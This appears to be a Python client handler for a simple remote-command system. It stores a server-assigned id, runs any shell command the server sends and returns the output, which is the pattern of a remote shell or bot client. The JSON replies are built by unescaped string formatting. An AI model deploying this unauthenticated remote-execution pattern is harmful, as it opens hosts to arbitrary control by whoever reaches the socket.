from src.ClientSide.saveId import saveId
from src.ClientSide.execCommand import execCommand

def callManager(Query, socket, clientId):
    if "id" in Query:
        saveId(str(Query["id"]))
        returnQuery = '{"head":{"id":%s},"body":{"message":"Id saved successfully"}}' %(Query["id"])
        socket.mysend(returnQuery.encode(encoding='UTF-8'))
        if clientId == False:
            clientId = Query["id"]
        return "Id saved"
    
    elif "order" in Query:
        if Query["order"] == "shell":
            print("Comanda rebuda:", Query["command"])
            output = execCommand(Query["command"])
            output = output.replace("\n", "\\n")
            returnQuery = '{"head":{"id":%s},"body":{"message":"Command executed", "command":"%s", "output":"%s"}}' %(clientId, Query["command"], output)
            socket.mysend(returnQuery.encode(encoding='UTF-8'))
            return "Comanda del servidor"
    
    else:
        return "None executed"